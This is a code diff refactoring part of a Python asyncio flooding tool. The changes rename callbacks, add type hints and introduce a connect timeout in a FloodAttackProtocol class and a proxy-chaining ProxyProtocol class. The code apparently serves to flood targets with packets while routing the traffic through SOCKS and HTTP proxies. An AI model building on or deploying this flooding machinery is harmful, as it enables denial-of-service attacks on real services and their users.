@@ -1,7 +1,9 @@
 import asyncio
 import io
 import socket
+from ssl import SSLContext
 import struct
+from typing import Callable, Optional, Tuple
 
 from python_socks.async_.asyncio._proxy import HttpProxy, Socks4Proxy, Socks5Proxy
 from python_socks.async_.asyncio import Proxy
@@ -19,30 +21,29 @@ from .core import logger, PacketPayload
 # XXX: how to tigger cancel properly?
 # XXX: type annotations
 class FloodAttackProtocol(asyncio.Protocol):
-    # XXX: payload could be a callback rather than bytes 
-    def __init__(self, loop, stats, payload: PacketPayload, settings, on_done: asyncio.Future):
+
+    def __init__(self, loop, stats, payload: PacketPayload, settings, on_close: asyncio.Future):
         self._loop = loop
         self._stats = stats
-        self._payload = payload
-        self._payload_size = len(payload) if isinstance(payload, bytes) else None
+        self._payload: PacketPayload = payload
+        self._payload_size: Optional[int] = len(payload) if isinstance(payload, bytes) else None
         self._settings = settings
-        # XXX: rename to _on_close
-        self._on_done = on_done
+        self._on_close: asyncio.Future = on_close
         self._transport = None
         self._handle = None
-        self._paused = False
-        self._budget = self._settings.requests_per_connection
-        self._return_code = False
+        self._paused: bool = False
+        self._budget: int = self._settings.requests_per_connection
+        self._return_code: bool = False
 
     def connection_made(self, transport) -> None:
-        self._stats.track_open_connection()
         self._transport = transport
         self._transport.set_write_buffer_limits(high=self._settings.high_watermark)
+        self._stats.track_open_connection()
         if hasattr(self._transport, "pause_reading"):
             self._transport.pause_reading()
         self._handle = self._loop.call_soon(self._send_packet)
 
-    def _prepare_packet(self):
+    def _prepare_packet(self) -> Tuple[bytes, int]:
         if self._payload_size is not None:
             return self._payload, self._payload_size
         else:
@@ -73,11 +74,11 @@ class FloodAttackProtocol(asyncio.Protocol):
         self._transport = None
         if self._handle:
             self._handle.cancel()
-        if self._on_done.done(): return
+        if self._on_close.done(): return
         if exc is not None:
-            self._on_done.set_exception(exc)
+            self._on_close.set_exception(exc)
         else:
-            self._on_done.set_result(self._return_code)
+            self._on_close.set_result(self._return_code)
 
     def pause_writing(self):
         self._paused = True
@@ -90,9 +91,19 @@ class FloodAttackProtocol(asyncio.Protocol):
 
 class ProxyProtocol(asyncio.Protocol):
 
-    def __init__(self, loop, proxy_url, proxy, dest, ssl, on_done, downstream_factory):
+    def __init__(
+        self,
+        loop,
+        proxy_url: str,
+        proxy: Proxy,
+        dest: Tuple[str, int],
+        ssl: Optional[SSLContext],
+        on_close: asyncio.Future,
+        downstream_factory: Callable[[], asyncio.Protocol],
+        connect_timeout: int = 30,
+    ):
         logger.debug(f"Factory called for {proxy_url}")
-        self._loop = loop # XXX: should be possible to give None for defaults
+        self._loop = loop
         self._transport = None
         self._downstream_factory = downstream_factory
         self._downstream_protocol = None
@@ -100,30 +111,30 @@ class ProxyProtocol(asyncio.Protocol):
         self._proxy = proxy
         self._dest = dest
         self._ssl = ssl
-        self._on_done = on_done
+        self._on_close = on_close
         self._dest_connected = False
-        # XXX: it's better to have multiple timeouts
-        self._exec_timeout = None
+        self._dest_connect_timer = None
+        self._dest_connect_timeout = connect_timeout
 
     def connection_made(self, transport):
         logger.debug(f"Connected to {self._proxy_url}")
         assert self._transport is None
         self._transport = transport
-        assert self._exec_timeout is None
-        # XXX: separately for connection & for execution cycle
-        self._exec_timeout = self._loop.call_later(300, self._abort_connection)
+        assert self._dest_connect_timer is None
+        self._dest_connect_timer = self._loop.call_later(
+            self._dest_connect_timeout, self._abort_connection)
         self._kickoff_negotiate()
-    
+
     def connection_lost(self, exc):
         logger.debug(f"Disconnected from {self._proxy_url} {exc}")
         self._transport = None
         if self._downstream_protocol is not None:
             self._downstream_protocol.connection_lost(exc)
-        if self._on_done.done(): return
+        if self._on_close.done(): return
         if exc is not None:
-            self._on_done.set_exception(exc)
+            self._on_close.set_exception(exc)
         else:
-            self._on_done.set_result(None)
+            self._on_close.set_result(None)
 
     def pause_writing(self):
         # XXX: dynamically remove to avoid constrant checks
@@ -151,7 +162,7 @@ class ProxyProtocol(asyncio.Protocol):
                 self._negotiate_data_received(data)
             except Exception as exc:
                 logger.debug(f"Processing failed for {self._proxy_url} with {exc}")
-                self._on_done.set_exception(exc)
+                self._on_close.set_exception(exc)
                 self._transport.abort()
 
     def _dest_connection_made(self):
@@ -159,6 +170,7 @@ class ProxyProtocol(asyncio.Protocol):
         self._dest_connected = True
         self._downstream_protocol = self._downstream_factory()
         if self._ssl is None:
+            self._cancel_dest_connect_timer()
             logger.debug(f"Dest is connected through {self._proxy_url}")
             self._downstream_protocol.connection_made(self._transport)
         else:
@@ -167,21 +179,27 @@ class ProxyProtocol(asyncio.Protocol):
                 self._loop.start_tls(self._transport, self._downstream_protocol, self._ssl))
             _tls.add_done_callback(self._setup_downstream_tls)
 
+    def _cancel_dest_connect_timer(self):
+        if self._dest_connect_timer is not None:
+            self._dest_connect_timer.cancel()
+            self._dest_connect_timer = None
+
     def _setup_downstream_tls(self, task):
-        # self._downstream_protocol.connection_made(transport)
+        self._cancel_dest_connect_timer()
         try:
             transport = task.result()
             self._downstream_protocol.connection_made(transport)
+            logger.debug(f"Dest is connected through {self._proxy_url}")
         except Exception as exc:
-            if not self._on_done.done():
-                self._on_done.set_exception(exc)
+            if not self._on_close.done():
+                self._on_close.set_exception(exc)
             self._transport.abort()
 
     def _abort_connection(self):
         logger.debug(f"Response timeout for {self._proxy_url}")
-        if not self._on_done.done():
+        if not self._on_close.done():
             # XXX: msot likely this should be timeout exception rather than None
-            self._on_done.set_result(None)
+            self._on_close.set_result(None)
         if self._transport is not None:
             self._transport.abort()
 
@@ -327,5 +345,4 @@ _CONNECTORS = {
 
 def for_proxy(proxy):
     return _CONNECTORS[type(proxy)]
-
 
